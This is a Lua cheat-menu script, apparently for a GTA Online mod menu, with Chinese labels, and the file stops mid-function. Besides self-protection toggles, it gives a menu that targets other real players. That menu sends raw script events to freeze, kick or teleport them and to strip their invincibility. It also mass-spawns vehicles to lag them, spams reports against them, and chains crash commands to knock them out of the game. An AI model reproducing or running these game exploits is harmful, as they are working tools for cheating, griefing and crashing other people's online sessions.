local block_spec_syncs
block_spec_syncs = menu.toggle_loop(fanghu, "阻止观看同步", {}, "阻止所有观看你的人的同步.", function()
    for _, pid in players.list(false, true, true) do
        if players.exists(pid) then
            if v3.distance(players.get_position(players.user()), players.get_cam_pos(pid)) < 15.0 then
                outgoingSyncs = menu.ref_by_rel_path(menu.player_root(pid), "Outgoing Syncs>Block")
                outgoingSyncs.value = true
                pos = players.get_position(players.user())
                if v3.distance(pos, players.get_cam_pos(pid)) < 25.0 then
                    repeat 
                        util.yield()
                    until v3.distance(pos, players.get_cam_pos(pid)) > 25.0 
                    outgoingSyncs.value = false
                end
            end
        end
    end
end)


menu.action(fanghu, "清除附近", {"cleanse"}, "", function()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
            cleanse_entitycount += 1
            util.yield()
        end
    end
    notification("已清除 " .. cleanse_entitycount .. " Peds", colors.black)
    cleanse_entitycount = 0
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            entities.delete_by_handle(vehicle)
            cleanse_entitycount += 1
            util.yield()
        end
    end
    notification("已清除 ".. cleanse_entitycount .." 载具", colors.black)
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
        cleanse_entitycount += 1
        util.yield()
    end
    notification("已清除 " .. cleanse_entitycount .. " 物体", colors.black)
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
        cleanse_entitycount += 1
        util.yield()
    end
    notification("已清除 " .. cleanse_entitycount .. " 可拾取物体", colors.black)
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
    end
    notification("已清除所有绳索", colors.black)
end)

menu.action(fanghu, "超级清", {"clear1"}, "", function()
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end

    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end

end)

menu.toggle_loop(fanghu, "循环清", {}, "", function()
    util.toast("循环清除中")
    MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)
end)
menu.action(fanghu, "删除附加", {}, "", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)
menu.toggle_loop(fanghu, "阻止颗粒物", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle(fanghu, "恐慌模式", {"panic"}, "这将呈现出一种反崩溃模式，不惜一切代价从游戏中移除各种事件。", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)
menu.toggle(fanghu, "自闭模式", {"panic"}, "昏哥模式", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
    end
end)

other=menu.list(yiyumain, "                           其他选项", {}, "", function(); end)
menu.divider(other, "其他选项")
mcxh=1
mcr=255
mcg=0
mcb=0
menu.toggle(other, "脚本名称显示", {"yiyuscriptname"}, "", function(state)

sname = state
   while sname do
       if mcxh==1 and mcg<256 then
           HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	
           if mcg == 255 then
               mcxh=2
           else
               mcg=mcg+1
           end
       elseif mcxh==2 and mcr>-1 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcr == 0 then
               mcxh=3
           else
               mcr=mcr-1
           end
       elseif mcxh==3 and mcb<256 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcb == 255 then
               mcxh=4
           else
               mcb=mcb+1
           end
       elseif mcxh==4 and mcg>-1 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcg == 0 then
               mcxh=5
           else
               mcg=mcg-1
           end
       elseif mcxh==5 and mcr<256 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcr == 255 then
               mcxh=6
           else
               mcr=mcr+1
           end
       elseif mcxh==6 and mcb>-1 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcb == 0 then
               mcxh=1
           else
               mcb=mcb-1
           end
       end
   draw_string(string.format("      ¦-&#8721;\n~bold~~italic~YIYU Lua Script"), 0.43,0.04, 0.55,6)
       util.yield()
   end
end)




function draw_string(s, x, y, scale, font)
    HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
    HUD.SET_TEXT_FONT(font or 0)
    HUD.SET_TEXT_SCALE(scale, scale)
    HUD.SET_TEXT_DROP_SHADOW()
    HUD.SET_TEXT_WRAP(0.0, 1.0)
    HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
    HUD.SET_TEXT_OUTLINE()
    HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
 end
 
 
 local replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
 local pedInterface = memory.read_long(replayInterface + 0x0018)
 local vehInterface = memory.read_long(replayInterface + 0x0010)
 local objectInterface = memory.read_long(replayInterface + 0x0028)
 local pickupInterface = memory.read_long(replayInterface + 0x0020)



menu.toggle_loop(other, "主机序列", {"yiyuhostqu"}, "", function()
zhujixvlie()
end)


local other1 = menu.list(other, '敏感话题', {}, '')

menu.toggle_loop(other1, "不自由毋宁死", {""}, "", function()
    MISC.FORCE_LIGHTNING_FLASH()
    draw_string(string.format("~r~         反对新闻封锁！！！ 言论自由！！！新闻自由！！！"), 0.22,0.35, 1,7)
util.show_corner_help("~bold~~r~每个中国人都应该知道1989.6.4天安门大屠杀！\n中共当局不应该隐瞒这段历史！\n ")
notification("不要在内网了解这些，没有任何可信度", colors.red)

util.toast("一党独裁，遍地是灾")
util.toast("人民不应该害怕政府，政府应该害怕人民")
logo_alpha = 1
directx.draw_texture(logo, 0.15, 0.02, 0.0, 0.0, 0.66, 0.57, 0, 1, 1, 1, logo_alpha)
directx.draw_texture(logo1, 0.15, 0.02, 0.0, 0.0, 0.35, 0.57, 0, 1, 1, 1, logo_alpha)
end)



local mingxie=menu.list(other, "鸣谢", {}, "")
menu.divider(mingxie, "=======作者=======")
menu.action(mingxie, "易宇", {}, "点击查看联系方式", function()
    util.show_corner_help(" ‹  ‹  ‹  \nDiscord:YIYU-易宇#3597 QQ:3548999193\n  ‹  ‹  ‹ ")
end)
menu.divider(mingxie, "======技术支持======")
menu.action(mingxie, "PIE sauce", {}, "PIE作者，点击查看联系方式", function()
    util.show_corner_help(" ‹  ‹  ‹  \nDiscord:Pie sauce#9312 QQ:3311906673\n  ‹  ‹  ‹ ")
end)
menu.action(mingxie, "Homer" , {}, "Heezy作者，点击查看联系方式", function()
    util.show_corner_help(" ‹  ‹  ‹  \nDiscord：Homer#5290 QQ:1733635528\n  ‹  ‹  ‹ ")
end)
menu.divider(mingxie, "======特别鸣谢======")
menu.action(mingxie, players.get_name(players.user()) , {}, "谢谢用户支持", function()
    util.show_corner_help("<font size='38'>~bold~感\n谢\n用\n户\n支\n持\n")
end)
menu.divider(mingxie, "======忠实粉丝======")
menu.action(mingxie, "iz5mc", {}, "sb", function()
end)
menu.action(mingxie, "意", {}, "", function()
end)
menu.action(mingxie, "Vidoliga", {},"", function()
end)
menu.action(mingxie, "十一", {}, "", function()
end)


menu.action(other,"点我查看更新日志",{},"",function ()
util.show_corner_help("<font size='12'>       YIYU Script~r~3.2~w~更新日志     \n~w~添加-玩家选项-崩溃-幻想崩溃\n添加-玩家选项-崩溃-无效绳索崩溃\n添加-玩家选项-崩溃-无效绳索崩溃+" )
end)
menu.action(other, "重新启动GTA", {}, "", function()
    MISC._RESTART_GAME()
end)
menu.action(other,"重启脚本",{},"",function ()
    util.restart_script()
end)
menu.action(other,"关闭脚本",{},"",function ()
    util.stop_script()
end)


local homedongtai3 = menu.divider(other, "主页动态3", {}, "")
local loading_frames = {'<>',' ',}
util.create_tick_handler(function()
    for _, frame in pairs(loading_frames) do
        menu.set_menu_name(homedongtai3, frame .. ' ' .. ver .. ' ' .. frame)
        util.yield(750)
    end
end)




local homedongtai = menu.divider(yiyumain, "主页动态2", {}, "")
local loading_frames = {'=====','+++++',}
util.create_tick_handler(function()
    for _, frame in pairs(loading_frames) do
        menu.set_menu_name(homedongtai, frame .. ' ' .. YIYU .. ' ' .. frame)
        util.yield(100)
    end
end)




local int_min = -2147483647
local int_max = 2147483647


local menus = {}
local function player_list(pid)
    menus[pid] = menu.list(players_list, players.get_name(pid), {}, "", function()
        menu.trigger_commands("yiyuscript " .. players.get_name(pid))
    end)
end

local function handle_player_list(pid) 
    local ref = menus[pid]
    if not players.exists(pid) then
        if ref then
            menu.delete(ref)
            menus[pid] = nil
        end
    end
end

players.on_join(player_list)
players.on_leave(handle_player_list)



KickScriptEvent = {
    1674887089,
    608596116,
    1781594056,
    -442434037
        }
    
    function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    
    function CreatePed(index, Hash, Pos, Heading)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        return SpawnedVehicle
    end
    
    function CreateObject(Hash, Pos, static)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_object(Hash, Pos)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if static then
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    
    util.keep_running()

    function set_up_player_actions(pid)



     menu.divider(menu.player_root(pid), "YIYU Script玩家选项", {}, "")
    local yiyu = menu.list(menu.player_root(pid), "YIYU Script", {"YIYUScript"}, "")

    PlayerMainMenu = menu.list(yiyu, "崩溃/踢出/恶搞选项", {}, "", function(); end)

    menu.action(yiyu, "传送至玩家", {""}, "", function()
        local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local spped = PLAYER.PLAYER_PED_ID()
            local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)
            ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)
            util.yield(10 * math.random())
end)	
menu.action(yiyu, "发送DDoS网络攻击", {}, "通过向其路由器发送数据包对玩家进行DDoS攻击", function()
    util.show_corner_help("~r~准备发送DDos攻击给" ..players.get_name(pid))
    util.yield(1900)
    local percent = 0
    while percent <= 100 do
        util.yield(100)
        util.show_corner_help(percent.. "% done")
        percent = percent + 1
    end
    util.yield(2000)
    util.show_corner_help("开个玩笑^^")
end)
function spawn_ped(ped_name, pid)
    local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local ped_hash = util.joaat(ped_name)
    STREAMING.REQUEST_MODEL(ped_hash)
    while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
        util.yield()
    end

    aab = v3()
    aab = ENTITY.GET_ENTITY_COORDS(V3, true)

    local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

    coords_ped = v3()
    coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
    coords_ped.x = coords_ped.x + math.random(-2, 2)
    coords_ped.y = coords_ped.y + math.random(-2, 2)
    coords_ped.z = coords_ped.z

    ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
    ENTITY.SET_ENTITY_VISIBLE(ped, false)
    notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.green)

end


     eg= menu.list(PlayerMainMenu, "恶搞", {}, "", function(); end)

   



    
    menu.toggle_loop(eg, "循环喷火", {""}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)

end)

menu.toggle_loop(eg, "循环喷水", {""}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)

end)
menu.toggle_loop(eg, "混合恶搞", {""}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
end)
menu.toggle_loop(eg, "电击枪折磨", {""}, "", function(on_click)
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local pos = ENTITY.GET_ENTITY_COORDS(ped)
for i = 1, 50 do
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
end
util.yield()
end)
menu.toggle_loop(eg, "原子能折磨", {""}, "", function(on_click)
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 0.3, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), true, false, 1.0)
    util.yield(250)
end)
menu.toggle_loop(eg, "循环烟花", {"fireworkloop"}, "", function()
    if players.exists(pid) then
        local player_pos = players.get_position(pid)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
        util.yield(100)
    end
end)
menu.toggle_loop(eg, "噪音V1", {}, "", function()
    local time = (util.current_time_millis() + 2000)
    while time > util.current_time_millis() do
        menu.trigger_commands("scripthost")
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        for i = 1, 10 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
        end
        util.yield_once()
    end
    while time > util.current_time_millis() do
        menu.trigger_commands("scripthost")
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        for i = 1, 10 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
        end
        util.yield_once()
    end
end)
menu.toggle_loop(eg, "噪音V2", {}, "", function()
util.trigger_script_event(1 << pid, {36077543, players.user(), math.random(1, 6)})
util.yield()
end)

menu.toggle_loop(eg, "弹飞他", {""}, "", function(on_click)
local poopy_butt = util.joaat("adder")
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local pos = ENTITY.GET_ENTITY_COORDS(player)
pos.z -= 10
request_model(poopy_butt)
local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
util.yield(250)
if vehicle ~= 0 then
    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    util.yield(250)
    entities.delete_by_handle(vehicle)
end
end)

menu.toggle_loop(eg, "模型冻结", {""}, "", function(on_click)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
end)
menu.toggle_loop(eg,"脚本冻结V1", {}, "", function()
    util.trigger_script_event(1 << pid , {330622597, pid, 0, 0, 0, 0, 0})
end)
menu.toggle_loop(eg, "脚本冻结V2", {}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid, {330622597, pid, 0, 0, 0, 0, 0})
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(pid)
    util.yield(500)
end)
menu.toggle_loop(eg, "仓库冻结", {}, "", function()
    util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, 0, 0})
    util.yield(500)
end)
menu.action(eg, "发送到佩里科岛", {""}, "", function()
    util.trigger_script_event(1 << pid, {-369672308, pid,1, 0, 0, 1, 1})
end)
menu.action(eg, "发送到海滩", {""}, "", function()
util.trigger_script_event(1 << pid, {330622597, players.user(), 0, 0, 4, 0})
end)
menu.action(eg, "发送到GTA介绍界面", {""}, "", function()
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(eg, "发送到高尔夫俱乐部", {""}, "", function()
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 193, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)
menu.action(eg, "公寓邀请V1", {""}, "", function()
util.trigger_script_event(1 << pid, {3592101251, players.user(), pid, 1, 0, -1, 4, 127, 0, 0, 0}) 
end)
menu.action(eg, "公寓邀请V2", {}, "", function()
    menu.trigger_commands("givesh" .. players.get_name(pid))
    menu.trigger_commands("aptme" .. players.get_name(pid))
end)
menu.action(eg, "公寓邀请V3", {}, "", function()
    util.trigger_script_event(1 << pid, {-702866045, players.user(), pid, -1, 1, 1, 0, 1, 0}) 
end) 
menu.toggle_loop(eg, "关闭玩家无敌", {}, "", function()
    util.trigger_script_event(1 << pid, {-1428749433, pid, 448051697, math.random(0, 9999)})
end)
menu.toggle_loop(eg,"移除载具无敌", {""}, "", function(on)
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
    ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
end
end)
menu.toggle_loop(eg,"循环举报", {""}, "", function(on)
    spam = on
    while spam do
        if pid ~= players.user() then
            menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
        end
        util.yield(10)
    end
end)

menu.action(eg,"载具笼子", {""}, "", function()
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end)
menu.action(eg, "美金笼子", {""}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) 
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) 
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) 
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) 

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) 
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) 
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) 
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) 

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) 
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(eg, "圣诞笼子", {""}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) 
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) 
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) 
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) 
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) 
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

         menu.action(eg,"货机掉帧", {eg1}, "", function() 
                 while not STREAMING.HAS_MODEL_LOADED(447548909) do
               STREAMING.REQUEST_MODEL(447548909)
             util.yield(10)
             end
                local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
                local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    end)




    Crash= menu.list(PlayerMainMenu, "崩溃", {}, "", function(); end)


    function request_model(hash, timeout)
        timeout = timeout or 3
        STREAMING.REQUEST_MODEL(hash)
        local end_time = os.time() + timeout
        repeat
            util.yield()
        until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
        return STREAMING.HAS_MODEL_LOADED(hash)
    end

    local function BlockSyncs(PlayerID, callback)
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= PlayerID then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "on")
            end
        end
        util.yield(10)
        callback()
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= PlayerID then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "off")
            end
        end
    end


    local function BlockSyncs(PlayerID, callback)
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= PlayerID then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "on")
            end
        end
        util.yield(10)
        callback()
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= PlayerID then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "off")
            end
        end
    end



    menu.action(Crash, "主机崩溃V1", {""}, "", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        menu.trigger_commands("tpmazehelipad")
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmazehelipad")
    end)


    menu.action(Crash, "主机崩溃V2", {""}, "", function()
        notification("开始崩溃", colors.black)
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmtchiliad")
        notification("崩溃完成 ", colors.black)
    end)
       

        menu.action(Crash, "AIO崩溃", {"tsarbomba"}, "", function()
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("eg1"..players.get_name(pid))
            menu.trigger_commands("crash14"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("b1"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash27"..players.get_name(pid))
            menu.trigger_commands("crash111"..players.get_name(pid))
            menu.trigger_commands("crash99"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash90"..players.get_name(pid))
            menu.trigger_commands("crash4"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash6"..players.get_name(pid))
            util.yield(400)
            menu.trigger_commands("crash7"..players.get_name(pid))
